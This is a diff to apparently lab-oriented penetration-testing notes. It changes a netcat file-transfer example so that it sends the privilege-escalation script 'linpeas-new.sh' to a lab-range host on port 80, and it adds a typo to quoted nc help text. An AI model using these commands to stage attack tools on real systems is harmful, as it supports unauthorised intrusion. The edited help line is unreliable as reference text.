@@ -12,12 +12,12 @@
 
   * On the recieving end  
     ```console
-    nc -l -p 4445 > source.zip
+    nc -l -p 80 > linpeas-new.sh
     ```  
 
   * On the sending end  
     ```console
-    nc -w 3 10.10.14.9 4445 < source.zip
+    nc -w 3 10.129.44.231 80 < linpeas-new.sh
     ```  
 
 
@@ -54,7 +54,7 @@
           -h                      this cruft
           -i secs                 delay interval for lines sent, ports scanned
           -k                      set keepalive option on socket
-          -l                      listen mode, for inbound connects
+          -l                      listen mode, for inbound connectsl
           -n                      numeric-only IP addresses, no DNS
           -o file                 hex dump of traffic
           -p port                 local port number
